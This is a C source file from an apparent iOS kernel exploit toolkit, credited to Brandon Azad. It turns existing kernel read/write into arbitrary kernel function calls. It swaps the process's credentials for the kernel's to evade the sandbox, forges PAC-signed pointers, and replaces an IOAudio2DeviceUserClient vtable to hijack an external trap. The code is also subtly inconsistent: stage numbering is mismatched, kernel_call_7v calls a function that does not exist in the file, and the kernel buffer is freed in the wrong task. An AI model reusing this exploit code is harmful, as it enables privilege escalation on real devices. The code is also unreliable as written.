/*
 * kernel_call/user_client.c
 * Brandon Azad
 */
#include "user_client.h"

#include <assert.h>

#include "IOKitLib.h"
#include "kernel_call.h"
#include "kc_parameters.h"
#include "pac.h"
#include "kernel_memory.h"
#include "kernel_slide.h"
#include "log.h"
#include "mach_vm.h"
#include "parameters.h"

// ---- Global variables --------------------------------------------------------------------------

// The connection to the user client.
static io_connect_t connection;

// The address of the user client.
static uint64_t user_client;

// The address of the IOExternalTrap.
static uint64_t trap;

// The size of our kernel buffer.
static const size_t kernel_buffer_size = 0x4000;

// The address of our kernel buffer.
static uint64_t kernel_buffer;

// The maximum size of the vtable.
static const size_t max_vtable_size = 0x1000;

// The user client's original vtable pointer.
static uint64_t original_vtable;

// ---- Stage 1 -----------------------------------------------------------------------------------

/*
 * kernel_get_proc_for_task
 *
 * Description:
 * 	Get the proc struct for a task.
 */
static uint64_t
kernel_get_proc_for_task(uint64_t task) {
	return kernel_read64(task + OFFSET(task, bsd_info));
}

/*
 * stage0_create_user_client
 *
 * Description:
 * 	Create a connection to an IOAudio2DeviceUserClient object.
 */
static bool
stage0_create_user_client() {
	bool success = false;
	// First get a handle to some IOAudio2Device driver.
	io_iterator_t iter;
	kern_return_t kr = IOServiceGetMatchingServices(
			kIOMasterPortDefault,
			IOServiceMatching("IOAudio2Device"),
			&iter);
	if (iter == MACH_PORT_NULL) {
		ERROR("could not find services matching %s", "IOAudio2Device");
		goto fail_0;
	}
	// Assume the kernel's credentials in order to look up the user client. Otherwise we'd be
	// denied with a sandbox error.
	uint64_t ucred_field, ucred;
	assume_kernel_credentials(&ucred_field, &ucred);
	// Now try to open each service in turn.
	for (;;) {
		// Get the service.
		mach_port_t IOAudio2Device = IOIteratorNext(iter);
		if (IOAudio2Device == MACH_PORT_NULL) {
			ERROR("could not open any %s", "IOAudio2Device");
			break;
		}
		// Now open a connection to it.
		kr = IOServiceOpen(
				IOAudio2Device,
				mach_task_self(),
				0,
				&connection);
		IOObjectRelease(IOAudio2Device);
		if (kr == KERN_SUCCESS) {
			success = true;
			break;
		}
		DEBUG_TRACE(2, "%s returned 0x%x: %s", "IOServiceOpen", kr, mach_error_string(kr));
		DEBUG_TRACE(2, "could not open %s", "IOAudio2DeviceUserClient");
	}
	// Restore the credentials.
	restore_credentials(ucred_field, ucred);
fail_1:
	IOObjectRelease(iter);
fail_0:
	return success;
}

/*
 * stage0_find_user_client_trap
 *
 * Description:
 * 	Get the address of the IOAudio2DeviceUserClient and its IOExternalTrap.
 */
static void
stage0_find_user_client_trap() {
	assert(MACH_PORT_VALID(connection));
	// Get the address of the port representing the IOAudio2DeviceUserClient.
	uint64_t user_client_port;
	bool ok = kernel_ipc_port_lookup(current_task, connection, &user_client_port, NULL);
	assert(ok);
	// Get the address of the IOAudio2DeviceUserClient.
	user_client = kernel_read64(user_client_port + OFFSET(ipc_port, ip_kobject));
	// Get the address of the IOExternalTrap.
	trap = kernel_read64(user_client + OFFSET(IOAudio2DeviceUserClient, traps));
	DEBUG_TRACE(2, "%s is at 0x%016llx", "IOExternalTrap", trap);
}

/*
 * stage0_allocate_kernel_buffer
 *
 * Description:
 * 	Allocate a buffer in kernel memory.
 */
static bool
stage0_allocate_kernel_buffer() {
	kern_return_t kr = mach_vm_allocate(kernel_task_port, &kernel_buffer,
			kernel_buffer_size, VM_FLAGS_ANYWHERE);
	if (kr != KERN_SUCCESS) {
		ERROR("%s returned %d: %s", "mach_vm_allocate", kr, mach_error_string(kr));
		ERROR("could not allocate kernel buffer");
		return false;
	}
	DEBUG_TRACE(1, "allocated kernel buffer at 0x%016llx", kernel_buffer);
	return true;
}

// ---- Stage 3 -----------------------------------------------------------------------------------

/*
 * kernel_read_vtable_method
 *
 * Description:
 * 	Read the virtual method pointer at the specified index in the vtable.
 */
static uint64_t
kernel_read_vtable_method(uint64_t vtable, size_t index) {
	uint64_t vmethod_address = vtable + index * sizeof(uint64_t);
	return kernel_read64(vmethod_address);
}

/*
 * stage2_copyout_user_client_vtable
 *
 * Description:
 * 	Copy out the user client's vtable to userspace. The returned array must be freed when no
 * 	longer needed.
 */
static uint64_t *
stage2_copyout_user_client_vtable() {
	// Get the address of the vtable.
	original_vtable = kernel_read64(user_client);
	uint64_t original_vtable_xpac = kernel_xpacd(original_vtable);
	// Read the contents of the vtable to local buffer.
	uint64_t *vtable_contents = malloc(max_vtable_size);
	assert(vtable_contents != NULL);
	kernel_read(original_vtable_xpac, vtable_contents, max_vtable_size);
	return vtable_contents;
}

/*
 * stage2_patch_user_client_vtable
 *
 * Description:
 * 	Patch the contents of the user client's vtable in preparation for stage 3.
 */
static size_t
stage2_patch_user_client_vtable(uint64_t *vtable) {
	// Replace the original vtable's IOUserClient::getTargetAndTrapForIndex() method with the
	// original version (which calls IOUserClient::getExternalTrapForIndex()).
	uint64_t IOUserClient__getTargetAndTrapForIndex = kernel_read_vtable_method(
			ADDRESS(IOUserClient__vtable),
			VTABLE_INDEX(IOUserClient, getTargetAndTrapForIndex));
	vtable[VTABLE_INDEX(IOUserClient, getTargetAndTrapForIndex)]
		= IOUserClient__getTargetAndTrapForIndex;
	// Replace the original vtable's IOUserClient::getExternalTrapForIndex() method with
	// IORegistryEntry::getRegistryEntryID().
	vtable[VTABLE_INDEX(IOUserClient, getExternalTrapForIndex)] =
		ADDRESS(IORegistryEntry__getRegistryEntryID);
	// Forge the pacia pointers to the virtual methods.
	size_t count = 0;
	for (; count < max_vtable_size / sizeof(*vtable); count++) {
		uint64_t vmethod = vtable[count];
		if (vmethod == 0) {
			break;
		}
#if __arm64e__
		assert(count < VTABLE_PAC_CODES(IOAudio2DeviceUserClient).count);
		vmethod = kernel_xpaci(vmethod);
		uint64_t vmethod_address = kernel_buffer + count * sizeof(*vtable);
		vtable[count] = kernel_forge_pacia_with_type(vmethod, vmethod_address,
				VTABLE_PAC_CODES(IOAudio2DeviceUserClient).codes[count]);
#endif // __arm64e__
	}
	return count;
}

/*
 * stage2_patch_user_client
 *
 * Description:
 * 	Patch the user client in preparation for stage 3.
 */
static void
stage2_patch_user_client(uint64_t *vtable, size_t count) {
	// Write the vtable to the kernel buffer.
	kernel_write(kernel_buffer, vtable, count * sizeof(*vtable));
	// Overwrite the user client's registry entry ID to point to the IOExternalTrap.
	uint64_t reserved_field = user_client + OFFSET(IORegistryEntry, reserved);
	uint64_t reserved = kernel_read64(reserved_field);
	uint64_t id_field = reserved + OFFSET(IORegistryEntry__ExpansionData, fRegistryEntryID);
	kernel_write64(id_field, trap);
	// Forge the pacdza pointer to the vtable.
	uint64_t vtable_pointer = kernel_forge_pacda(kernel_buffer, 0);
	// Overwrite the user client's vtable pointer with the forged pointer to our fake vtable.
	kernel_write64(user_client, vtable_pointer);
}

/*
 * stage2_unpatch_user_client
 *
 * Description:
 * 	Undo the patches to the user client.
 */
static void
stage2_unpatch_user_client() {
	// Write the original vtable pointer back to the user client.
	kernel_write64(user_client, original_vtable);
}

// ---- API ---------------------------------------------------------------------------------------

bool
stage1_kernel_call_init() {
	// Initialize the parameters. We do this first to fail early.
	bool ok = kernel_call_parameters_init();
	if (!ok) {
		return false;
	}
	// Create the IOAudio2DeviceUserClient.
	ok = stage0_create_user_client();
	if (!ok) {
		ERROR("could not create %s", "IOAudio2DeviceUserClient");
		return false;
	}
	// Find the IOAudio2DeviceUserClient's IOExternalTrap.
	stage0_find_user_client_trap();
	// Allocate the kernel buffer.
	ok = stage0_allocate_kernel_buffer();
	if (!ok) {
		return false;
	}
	return true;
}

void
stage1_kernel_call_deinit() {
	if (trap != 0) {
		// Zero out the trap.
		uint8_t trap_data[SIZE(IOExternalTrap)];
		memset(trap_data, 0, SIZE(IOExternalTrap));
		kernel_write(trap, trap_data, SIZE(IOExternalTrap));
		trap = 0;
	}
	if (kernel_buffer != 0) {
		// Deallocate our kernel buffer.
		mach_vm_deallocate(mach_task_self(), kernel_buffer, kernel_buffer_size);
		kernel_buffer = 0;
	}
	if (MACH_PORT_VALID(connection)) {
		// Close the connection.
		IOServiceClose(connection);
		connection = MACH_PORT_NULL;
	}
}

uint64_t
stage1_get_kernel_buffer() {
	assert(kernel_buffer_size >= 0x2000);
	return kernel_buffer + kernel_buffer_size - 0x1000;
}

uint32_t
stage1_kernel_call_7v(uint64_t function, size_t argument_count, const uint64_t arguments[]) {
	assert(function != 0);
	assert(argument_count <= 7);
	assert(argument_count == 0 || arguments[0] != 0);
	assert(MACH_PORT_VALID(connection) && trap != 0);
	// Get exactly 7 arguments. Initialize args[0] to 1 in case there are no arguments.
	uint64_t args[7] = { 1 };
	for (size_t i = 0; i < argument_count && i < 7; i++) {
		args[i] = arguments[i];
	}
	// Initialize the IOExternalTrap for this call.
	uint8_t trap_data[SIZE(IOExternalTrap)];
	FIELD(trap_data, IOExternalTrap, object,   uint64_t) = args[0];
	FIELD(trap_data, IOExternalTrap, function, uint64_t) = function;
	FIELD(trap_data, IOExternalTrap, offset,   uint64_t) = 0;
	kernel_write(trap, trap_data, SIZE(IOExternalTrap));
	// Perform the function call.
	uint32_t result = IOConnectTrap6(connection, 0,
			args[1], args[2], args[3], args[4], args[5], args[6]);
	return result;
}

bool
stage3_kernel_call_init() {
	uint64_t *vtable = stage2_copyout_user_client_vtable();
	size_t count = stage2_patch_user_client_vtable(vtable);
	stage2_patch_user_client(vtable, count);
	free(vtable);
	return true;
}

void
stage3_kernel_call_deinit() {
	if (original_vtable != 0) {
		stage2_unpatch_user_client();
		original_vtable = 0;
	}
}

uint32_t
kernel_call_7v(uint64_t function, size_t argument_count, const uint64_t arguments[]) {
	return stage2_kernel_call_7v(function, argument_count, arguments);
}

void
assume_kernel_credentials(uint64_t *ucred_field, uint64_t *ucred) {
  uint64_t proc_self = kernel_get_proc_for_task(current_task);
  uint64_t kernel_proc = kernel_get_proc_for_task(kernel_task);
  uint64_t proc_self_ucred_field = proc_self + OFFSET(proc, p_ucred);
  uint64_t kernel_proc_ucred_field = kernel_proc + OFFSET(proc, p_ucred);
  uint64_t proc_self_ucred = kernel_read64(proc_self_ucred_field);
  uint64_t kernel_proc_ucred = kernel_read64(kernel_proc_ucred_field);
  kernel_write64(proc_self_ucred_field, kernel_proc_ucred);
  *ucred_field = proc_self_ucred_field;
  *ucred = proc_self_ucred;
}

void
restore_credentials(uint64_t ucred_field, uint64_t ucred) {
  kernel_write64(ucred_field, ucred);
}
